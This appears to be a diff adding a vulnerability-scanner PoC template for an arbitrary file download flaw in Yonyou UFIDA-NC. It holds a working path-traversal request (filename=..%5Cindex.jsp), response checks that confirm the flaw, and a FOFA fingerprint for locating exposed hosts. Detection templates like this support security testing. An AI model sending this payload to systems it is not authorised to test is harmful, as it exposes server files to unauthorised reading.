@@ -1,0 +1,22 @@
+id: poc-yaml-yonyou-ufida-nc-download-file-download
+info:
+  name: 用友UFIDA-NC download 任意文件下载漏洞
+  severity: critical
+  tags:
+  - 文件读取
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,"nc.uap.lfw.core.LfwRuntimeEnvironment") &&
+
+    contains(headers,`filename=..\index.jsp`) &&
+
+    contains(content_type,"application/x-msdownload")
+
+    '
+variables: {}
+transport: http
